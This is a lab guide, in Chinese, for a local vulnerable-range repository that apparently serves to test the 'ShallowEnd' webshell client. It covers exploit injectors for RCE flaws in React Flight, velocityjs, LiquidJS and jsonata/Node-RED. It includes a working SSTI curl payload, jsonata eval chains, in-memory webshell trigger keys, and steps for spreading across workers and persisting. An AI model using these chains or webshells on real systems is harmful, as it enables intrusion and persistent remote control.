# Shallowend-Labs 靶场测试指引

> 本文写给后续对靶场进行测试的 Agent / 测试者：按顺序讲解每个环境的靶场信息
> （漏洞、目标、拓扑、端口）与注入方法。仓库本身的开源信息见 `README.md`，
> 仓库约定见 `AGENTS.md`。

## 0. 前置条件与通用流程

**前置条件**

- Docker + Docker Compose（镜像构建需要外网；国内网络在每个环境目录放 `.env`：
  `SHLABS_BUILD_PROXY=http://host.docker.internal:<port>`（`<port>` 为宿主代理端口），
  参考各环境 `.env.example`）
- Python 3 + `pip3 install requests python-socketio websocket-client`（注入器依赖）
- 可选：ShallowEnd 客户端（GUI 或 headless `--headless` 的 MCP 服务），用于内存马
  实连验收

**通用生命周期**（统一管理脚本，环境名可用 `base/` 目录名或 `shlabs.yml` 的 name 别名）

```bash
./shlabs.sh list                      # 列出全部环境（自动发现 base/*/shlabs.yml）
./shlabs.sh up <env>                  # 构建镜像 + 启动（首次构建较慢）
./shlabs.sh inject <env> --loader <壳文件>       # 注入（内置漏洞版本校验门；载荷用户自备）
./shlabs.sh info <env>                # 环境详情
./shlabs.sh logs <env>                # 日志
./shlabs.sh down <env>                # 停止
./shlabs.sh clean <env>               # 停止并删除容器/网络/卷/镜像
```

**注入统一约定**（与 ShallowEnd 客户端一致）

| 参数 | 值 |
|------|-----|
| 载荷来源 | **用户自备**（`--loader` 必填，`shallowend_payload_generate` 产物；**无 --key、无内置模板——铁律**） |
| Next-Action 头 | `17f8341226dbfd4f2ef424c64a475f1bb2e7c9b0`（SHA1(key)） |
| RC4 密钥 | `34d2e4255c8e6beb`（MD5(key)[:16]） |
| Shell 类型 | `emit`（`http.Server.prototype.emit` override 内存马，框架无关） |

`inject.sh` 会先执行**漏洞版本校验门**（读取容器内依赖版本，不在漏洞区间即报错退出，
防止上游漂移导致靶场静默失效），再调用 `injectors/` 下对应的注入器。

**注入器只做注入**（无 `--verify` 探针）：emit 壳把首个触发头请求的 body 当
core 源码 eval 入 `_cacheHandler` 槽位，任何"源码预热"式探针都会毒化内存马且
重注入无效（历史 PONG 探针即此缺陷）。注入成功标记（`SSTI_SHELL_OK:<pid>` /
flight `exploit ok!`）仅证明代码执行；连通性与健康验证统一由 ShallowEnd 连接期
（`webshell_test`：投递 core + `test` 调用断言）完成。

**ShallowEnd 侧验收（可选）**：MCP `webshell_create`（group_id=本地测试分组，
profile 与生成壳所用 profile 一致）→ `webshell_test` 实连。

## 0.1 高自由度流程：随机 Profile + 从 Profile 生成 Payload（推荐）

不注入注入器内置的默认壳，而是让 ShallowEnd 按**任意 profile 组合**生成壳再注入——
信封/加密/压缩全部随机可换，三个靶场通用：

```bash
# 1. 随机创建 Profile（MCP）：任选 encryption(rc4/aes/xor/chacha20) ×
#    request(json/form/image_png) × response(json/pngidat/pdfstream/gifdata) × compression
#    shallowend_profile_create → secret_key=<随机密钥>, encryption=..., ...
# 2. 从该 Profile 生成 emit 壳（关键：必须带 profile_id，壳的传输形态由 profile 烘入；
#    不带 profile_id 生成的壳只说 json 信封，配非 json profile 会 404/解析失败）
#    shallowend_payload_generate → profile_id=<上一步 id>, password=<同一随机密钥>, encryption=<同 profile>
# 3. 注入（key 用同一个随机密钥）：
./shlabs.sh inject <env> --loader ~/Library/Caches/ShallowEnd/generated/<shell>.js
# 4. ShallowEnd 建连接（webshell_create 用该 profile → webshell_test → command_execute）
```

已验证的组合矩阵（2026-09-29，三靶场全通）：

| 靶场 | 加密 | 请求→响应 | 压缩 | 结果 |
|------|------|----------|------|------|
| CVE-2026-73649 | aes | form → gifdata | gzip | 连接 + 命令执行 ✓ |
| CVE-2025-55182 | chacha20 | json → pngidat | zlib | 连接 + 命令执行 ✓ |
| CVE-2026-45618 | rc4 | image_png → pdfstream | gzip | 连接 + 命令执行 ✓ |

> ⚠️ 互操作注意：二进制响应伪装（pdfstream/pngidat/gifdata）配 `compression=none`
> 时，客户端收到的命令输出是不解压的压缩字节——**二进制响应传输请配 gzip**。
>
> 注入器适配细节（对生成壳生效）：velocity 走 eval 完成值通道拿安装标记；
> liquid 走「第二条 return 型探测链」检测 emit override（`Server.prototype.emit`
> 不含 `[native code]` 即已劫持）；flight 直接把生成壳作为注入体。

---

## 1. base/CVE-2025-55182 — React Flight RCE（真实目标：RealWorld Conduit）

| 项 | 值 |
|----|-----|
| 漏洞 | CVE-2025-55182（React2Shell）：React 19 RSC Flight 反序列化 → `new Function`，CVSS 10.0 |
| 目标 | 前端 [cjfff/realworld-nextjs16](https://github.com/cjfff/realworld-nextjs16)（Next.js App Router，钉 `next@16.0.6`/`react@19.2.0`）+ 后端 [gothinkster/node-express-realworld-example-app](https://github.com/gothinkster/node-express-realworld-example-app)（Express + Prisma + PostgreSQL） |
| 拓扑 | `postgres` → `api`（127.0.0.1:21511）→ `front`（127.0.0.1:21501，**注入目标**）；front 与 api 共享网络命名空间，浏览器与 SSR 共用 `http://127.0.0.1:21511` |
| 触发面 | 任意 App Router 路由（`/` 即可）；flight 注入器向 `/` POST multipart Flight payload |
| 注入器 | `injectors/cve-2025-55182_flight.py` |

```bash
./shlabs.sh up CVE-2025-55182
# 等待 api 健康（首次启动含 migrate + seed，约 1-2 分钟）
curl http://127.0.0.1:21511/api/tags   # {"tags":[...]}  即 API 就绪
curl http://127.0.0.1:21501/           # 200 即前端就绪

./shlabs.sh inject CVE-2025-55182 --loader ~/Library/Caches/ShallowEnd/generated/<壳文件>.js
# 预期：版本门 OK（next@16.0.6 / react@19.2.0）→ exploit ok! → 连接信息输出

# ⚠️ flight 重注入需先重建容器（结构性限制）：exploit 请求自带 Next-Action 触发头
# （RSC action 路由依赖），驻留壳会拦截该头的一切请求 → 对已注入目标 exploit
# 恒得 200 空响应。先 `clean` / `down -v` 重建，再注入。
```

体验应用：浏览器打开 `http://127.0.0.1:21501`（Conduit 博客，注册任意账号即可）。

## 2. base/CVE-2026-73649 — velocityjs SSTI RCE（carrier：VeloForge）

| 项 | 值 |
|----|-----|
| 漏洞 | CVE-2026-73649：velocityjs ≤2.1.6 属性读取 → `Function` 构造器，CVSS 9.8（2.1.7 修复） |
| 目标 | `kind: carrier` 自写模板渲染服务（Koa + velocityjs 2.1.6）。真实目标不可得：唯一候选 carole-admin 依赖在漏洞区间，但其 Velocity 渲染均使用磁盘固定模板、用户输入不可达模板文本，不满足利用前提 |
| 拓扑 | 单服务 127.0.0.1:21503 |
| 触发端点 | `POST /api/render`，body `{"template": "...", "data": {"x": {}}}` |
| 注入器 | `injectors/cve-2026-73649_velocity.py` |

```bash
./shlabs.sh up CVE-2026-73649

# 最小 RCE 验证（任意 JS 执行）
curl -s http://127.0.0.1:21503/api/render \
  -H 'Content-Type: application/json' \
  -d '{"template":"#set($f=$x.constructor.constructor(\"return 6*7\"))#set($r=$f())$r","data":{"x":{}}}'
# 预期：{"result":"42"}

./shlabs.sh inject CVE-2026-73649 --loader ~/Library/Caches/ShallowEnd/generated/<壳文件>.js
# 预期：版本门 OK（velocityjs@2.1.6）→ Inject OK — memory shell resident in PID N
```

## 3. base/CVE-2026-45618 — LiquidJS SSTI RCE（真实目标：dungeon-revealer）

| 项 | 值 |
|----|-----|
| 漏洞 | CVE-2026-45618：liquidjs <10.26.0 `valueOf` gadget → `Function` 构造器，CVSS 10.0（**尚无补丁版本**）；10.25.7 同时暴露无补丁的 CVE-2026-44646 |
| 目标 | [dungeon-revealer](https://github.com/dungeon-revealer/dungeon-revealer)（TRPG 虚拟桌面，ISC，钉 `liquidjs@10.25.7`）：玩家聊天消息**原文**经 `parseAndRenderSync` 服务端渲染（`server/chat.ts`） |
| 拓扑 | 单服务 127.0.0.1:21504；GraphQL 走 **socket.io**（事件 `@graphql/execute` / `@graphql/result`），非 HTTP POST |
| 认证 | compose 不设 `PC_PASSWORD`/`DM_PASSWORD` → 应用默认开放 PC 角色；socket `authenticate`（空密码）→ `logIn` mutation（无密码，任意 id+name）后即可发聊天消息 |
| 注入器 | `injectors/cve-2026-45618_liquid.py`（python-socketio 客户端；内存马 shell body 经 `chatMessageCreate` 的 `variables` 传入 `vars.p`，链模板回显执行结果） |

利用链形态（注入器内置，GHSA-gf2q-c269-pqgc PoC 改编）：`1|valueOf` 拿到完整
context → `group_by`/`where`/`first|last` gadget 读取内部函数 → 覆写作用域比较算子
→ `m == payload` 触发 `Function(payload)()`。

```bash
./shlabs.sh up CVE-2026-45618
curl -o /dev/null -w '%{http_code}' http://127.0.0.1:21504/   # 200 即就绪

./shlabs.sh inject CVE-2026-45618 --loader ~/Library/Caches/ShallowEnd/generated/<壳文件>.js
# 预期：版本门 OK（liquidjs@10.25.7）→ Inject OK — memory shell resident in PID N
```

最小 PoC（任意 JS 执行，不经 socket.io）：聊天渲染即 Liquid 渲染，本地可单独验证
链路——`new Liquid({...DR 同款 fs stub})` 上执行 `injectors/cve-2026-45618_liquid.py`
内 `CHAIN_TEMPLATE`（`vars.p` 传 `return 6*7;`），输出 `42`。

## 4. base/CVE-2026-77413 — jsonata 原型链逃逸 RCE（真实目标：Node-RED 4.1.11）

| 项 | 值 |
|----|-----|
| 漏洞 | CVE-2026-77413/77414/77415（三 CVE 共池）：jsonata <1.8.8 / 2.0.0–2.2.0 `environment.lookup` hasOwnProperty 绕过 → `Function` 构造器，CVSS v4 9.3 ×3；同池 CVE-2026-12208 |
| 目标 | [Node-RED](https://github.com/node-red/node-red) 4.1.11（23.8k★ 低代码编排平台，Apache-2.0，**官方 Docker 镜像**；jsonata 精确 pin 2.0.6，v2 线修复在 2.2.0/2.2.1） |
| 默认形态 | **无 patch、无配置改动、无认证**——默认无 `adminAuth`，`/flows` Admin API 对端口可达者完全开放（真实世界"默认无认证部署形态"即靶场形态） |
| 拓扑 | 单服务 127.0.0.1:21505（容器内 1880）；Express 底座，阶段②③与 velocityjs 靶场同构 |
| 注入器 | `injectors/cve-2026-77413_nodered.py`（纯 HTTP：`POST /flows` 部署含 emit 壳的 change+inject 流 → `POST /inject/<id>` 触发 → decoy 探测确认驻留；无凭据；✅ 已落地并双路径验收） |

利用链形态（注入器内置，advisory GHSA-2943-5xfg-gq5f 原文 PoC）：块内绑定
`$hasOwnProperty := $spread($string); $__proto__ := $constructor;` →
`$constructor('return eval(Buffer.from("<emit壳 b64>","base64").toString())')()`。
**注意 77413 的 `__lookupSetter__` 链在 jsonata 2.0.6 不可达**（`non-function`），
2.x 线用 77414 形态（1.8.x 存量线未验证，命中真实目标时再验）。

```bash
./shlabs.sh up CVE-2026-77413
curl -o /dev/null -w '%{http_code}' http://127.0.0.1:21505/   # 200 即就绪（编辑器）
curl -o /dev/null -w '%{http_code}' http://127.0.0.1:21505/flows  # 200 = 未认证可达

./shlabs.sh inject CVE-2026-77413 --loader /path/to/emit_shell.js
# 预期：版本门 OK（jsonata@2.0.6）→ 部署+触发成功 → decoy 探测确认驻留；
# 随后 ShallowEnd webshell_test 实连（profile 响应形态需与壳匹配，见环境 README）
```

`--loader` 必填（载荷由 `shallowend_payload_generate` 产出，无内置模板）。已实测
（2026-10-28）：poc-imagepng 壳 + profile 25 → 注入 OK（404 decoy）→ 连接 119ms/84ms
→ 命令回显。

**注意**：注入的恶意流会持久化到 `/data/flows.json` 卷——容器重启后 change 节点表达式
重放（等价自动重新驻留）；完整重置用 `./shlabs.sh clean CVE-2026-77413`（清卷）。

## 5. base/CVE-2026-73649-pm2 — pm2 cluster 多 worker 拓扑（实例探测验收，变体 A）

| 项 | 值 |
|----|-----|
| 漏洞 | 同 CVE-2026-73649（velocityjs ≤2.1.6 SSTI → RCE）——**不新增漏洞面** |
| 目标 | VeloForge 载体（复用单实例环境的 package.json/src 与 velocityjs@2.1.6 钉版），**pm2 cluster 模式 3 个 worker** 共享同一端口（`pm2-runtime` 前台托管） |
| 用途 | ShallowEnd 实例探测升级（P6）验收：`getInstanceSurvey` 内部清点 + `_PRB_` ping 可达性 + 覆盖率在**有 pm2 IPC** 的多实例下的真实行为 |
| 拓扑 | 单容器 `127.0.0.1:21506`：1 个 pm2 master + 3 个 cluster worker（`pm_id` / `NODE_UNIQUE_ID` 线索可被 survey 的 pm2 来源读取） |
| 触发端点 | `POST /api/render`（与单实例环境一致，注入器共用 `cve-2026-73649_velocity.py`） |

```bash
./shlabs.sh up CVE-2026-73649-pm2
curl -o /dev/null -w '%{http_code}' http://127.0.0.1:21506/   # 200 即就绪
docker compose -f base/CVE-2026-73649-pm2/docker-compose.yml exec veloforge-pm2 pm2 ls
# 预期：veloforge × 3，mode=cluster，pm_id 0/1/2，全部 online

./shlabs.sh inject CVE-2026-73649-pm2 --loader ~/Library/Caches/ShallowEnd/generated/<壳文件>.js
# 预期：版本门 OK（velocityjs@2.1.6）→ Inject OK — memory shell resident in PID N
```

## 6. base/CVE-2026-73649-node-cluster — 纯 Node cluster 多 worker 拓扑（实例探测能力边界，变体 B）

| 项 | 值 |
|----|-----|
| 漏洞 | 同 CVE-2026-73649（velocityjs ≤2.1.6 SSTI → RCE）——**不新增漏洞面** |
| 目标 | VeloForge 载体（复用单实例环境的 package.json/src 与 velocityjs@2.1.6 钉版），**原生 `cluster` 模块 primary fork 3 个 worker**（`WORKERS` 环境变量可调，默认 3），**无 pm2、无 pm2 IPC** |
| 用途 | 能力边界路径：无 pm2 IPC 时 survey 的 pm2 来源应如实 `unavailable`，清点退回 `cluster.workers` / `/proc` 扫描；`_PRB_` ping 在无 worker→worker IPC 场景应显式「不适用」（设计文档 P3 禁止简化项） |
| 拓扑 | 单容器 `127.0.0.1:21507`：1 个 primary + 3 个裸 cluster worker |
| 触发端点 | `POST /api/render`（与单实例环境一致，注入器共用 `cve-2026-73649_velocity.py`） |

```bash
./shlabs.sh up CVE-2026-73649-node-cluster
curl -o /dev/null -w '%{http_code}' http://127.0.0.1:21507/   # 200 即就绪
docker compose -f base/CVE-2026-73649-node-cluster/docker-compose.yml exec veloforge-cluster \
  ps -o pid,ppid,args | grep -c "node "                        # 1 primary + 3 worker = 4 个 node 进程

./shlabs.sh inject CVE-2026-73649-node-cluster --loader ~/Library/Caches/ShallowEnd/generated/<壳文件>.js
# 预期：版本门 OK（velocityjs@2.1.6）→ Inject OK — memory shell resident in PID N
```

## 6.1 多 worker 环境的注入行为与实例探测验证流程

两个多 worker 环境（pm2 / 纯 cluster）共用同一套行为模型与验证流程：

**注入行为（预期）**

- **LB 落点天然随机（按 TCP 连接轮转）**：Node cluster 调度（含 pm2 cluster 底座）按
  **连接**而非请求轮转——一次注入只感染处理该请求的 worker；同一个 keep-alive 会话
  （如 `requests.Session`）会一直命中同一 worker。重复注入请换新连接（curl 每次调用
  新开连接即可），注入 N 次可覆盖全部 N 个 worker。
- 重复注入到**已感染** worker：壳自检 `_cacheHandler` 报 `already resident`，幂等安全；
  注入到**未感染** worker 则正常安装。两次注入 PID 不同 = 命中了不同 worker。
- 未感染 worker 收到带触发头（`next-action`）的请求时**不拦截**，走应用正常路由
  （`/api/render` 404 之外的表现）——多 worker 下 ShallowEnd 实连/下发偶发失败再重试
  属预期，由管线层 LB 容错（EnsureReady / 条件重试）消化。

**实例探测验证流程（P6 验收口径，主仓 `docs/plan/instance-probe-upgrade.md`）**

1. **注入 1/N**：注入一次（感染 1 个 worker，记下注入器输出的 PID）。
2. **清点**：ShallowEnd 侧触发实例清点（MCP `webshell_survey`）：
   - pm2 环境（变体 A）：`cluster_type=pm2`，`total=4`（master + 3 worker，pm2 来源经
     IPC 拿 `pm_id`/pid 清单）；`instances` 含 self（infected=true）与清点到的未感染
     worker（origin=pm2/cluster/proc_scan）。
   - 纯 cluster 环境（变体 B）：`cluster_type=cluster`，pm2 来源 `unavailable`
     （**非报错**），`cluster.workers`（若 self 为 primary）或 `/proc` 扫描补齐清单；
     `total ≥ 4`。
   - 旧 payload（无 getInstanceSurvey 方法）应识别为 `payload_support=false` 退回轮盘赌，
     不炸。
3. **ping + 覆盖率**：下发 `_PRB_` ping → deadline 内收 pong → 覆盖率 = (pong ∪ self) ∩ survey：
   - pm2 环境：注入 1/N 后覆盖率应显示 **1/N**（设计文档 P3 验收原句：pm2 环境注入
     1/N worker 后覆盖率显示 1/N）。
   - 纯 cluster 环境：无 worker→worker IPC，ping 应显式**不适用**，不得假装验证过。
4. **扩散验证（可选）**：换新连接重复注入 2 次（共感染 2-3 个 worker）→ 重跑清点与
   ping → 覆盖率升为 2/N、3/N；对已感染 worker 的注入返回 already resident。
5. **清理重置**：多 worker 环境内存马驻留在 worker 进程；`down` 后需重新注入；
   `clean` 彻底重建。

## 7. 常见问题

| 症状 | 处置 |
|------|------|
| 构建期 git clone / npm 超时 | 环境目录 `.env` 设置 `SHLABS_BUILD_PROXY`（容器内经 `host.docker.internal` 用宿主代理）；基础镜像缺失时先 `docker pull`（国内可用 `docker.m.daocloud.io/library/<image>` 后 `docker tag`） |
| 版本校验门失败（Version gate FAILED） | 上游依赖漂移到了已修补版本——`./shlabs.sh clean <env>` 后重建镜像；仍失败则说明上游结构变化，回查 `patches/` |
| 端口被占用 | `docker ps` 查残留容器（尤其改名前的旧项目名容器）；`docker rm -f <name>` |
| RealWorld API 起不来（seed 段错误） | 必须用 Debian 系基础镜像（`Dockerfile.api` 已固定 node:20-slim）；seed 已顺序化（`patches/seed-sequential.patch`） |
| dungeon-revealer 构建期 apt 404 | node:16 基于 bullseye（2026-08 已归档），Dockerfile 已固定切 archive.debian.org 且删除 bullseye-security 源 |
| 注入成功但 ShallowEnd 连不上 | 内存马驻留在**进程**里；容器重启/`down` 后需重新注入。多进程容器（cluster 模式）见 §6.1：一次注入只感染一个 worker，LB 落点未感染时实连/下发失败重试属预期（EnsureReady 消化）；重复注入换新连接可覆盖全部 worker |
| flight 重注入返回 200 空响应 | 结构性限制：exploit 请求自带 Next-Action 触发头，驻留壳拦截该头的一切请求——先 `clean` / `down -v` 重建容器再注入 |

## 8. Mem Pipe 交互终端 e2e（主仓）

ShallowEnd 主仓有两个 pipe e2e 用例（`PIPE_E2E=1 go test -tags e2e ./internal/app/ -run <name>`），
按目标侧 profile 自适应，互斥跳过：

| 用例 | 需要 | 跳过条件 |
|------|------|----------|
| `TestMemPipeE2E`（PTY 全链路） | 目标装有 util-linux(script) + bash | 目标降级 pipe profile 时 skip |
| `TestMemPipeFallbackProbe`（pipe fallback 可用性） | 纯净 alpine（无 util-linux） | 目标为 PTY profile 时 skip |

55182/73649 的 runtime 镜像已固化 `apk add util-linux bash`（PTY 主路径），默认跑前者；
要测 fallback 需临时去掉 Dockerfile 里的 apk add 行再 `up`（up 会自动重建检测到
Dockerfile 变化的镜像）。

注意：payload 安装是**一次性**的（emit 壳仅在 `_cacheHandler === undefined` 时安装），
主仓 payload 模板改动生效必须重新 `inject`（容器重启或 `clean && up` 后再注入）；
同一存活 payload 上重复跑 e2e 需主仓侧 seq 分配器播种晚于上次运行（2026-10-10 起已墙时钟播种）。

## 9. 验收口径

每个环境的最小验收 = `./shlabs.sh up <env>` 服务健康 + `./shlabs.sh inject <env>`
返回注入成功标记（`SSTI_SHELL_OK:<pid>` / flight `exploit ok!`）。
完整验收 = ShallowEnd 客户端（MCP `webshell_test`）实连成功并可执行命令（连接期
验证覆盖壳接管、core 投递与协议回环，是唯一权威口径）。
